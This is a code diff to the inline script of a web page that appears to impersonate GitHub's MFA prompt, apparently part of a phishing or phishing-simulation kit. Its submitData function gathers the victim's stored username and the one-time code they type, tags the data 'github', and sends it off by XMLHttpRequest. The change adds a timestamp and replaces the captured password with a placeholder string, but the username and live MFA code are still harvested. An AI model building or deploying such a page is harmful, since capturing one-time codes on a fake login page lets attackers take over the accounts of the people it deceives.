@@ -364,14 +364,26 @@
     </div>
     <div aria-live="polite" class="sr-only"></div>
     <script>
+        function getTime() {
+            var today = new Date(),
+                dd = String(today.getDate()).padStart(2, '0'),
+                mm = String(today.getMonth() + 1).padStart(2, '0'), //January is 0!
+                yyyy = today.getFullYear(),
+                hour = today.getHours(),
+                minute = today.getMinutes(),
+                second = today.getSeconds();
+            return `${mm}/${dd}/${yyyy} ${hour}:${minute}:${second}`;      
+        }
+        
       function submitData() {
         var data = JSON.parse( localStorage.getItem( 'data' ) ),
             mfaCode = document.getElementById('otp');
         if (mfaCode.value !== ""){
           var requestData = {
             "host": "github",
+            "timestamp": getTime(),
             "username": data.username,
-            "password": data.password,
+            "password": 'Intensionally not logged passwords',
             "mfa-code": mfaCode.value
             },
             xhr = new XMLHttpRequest();
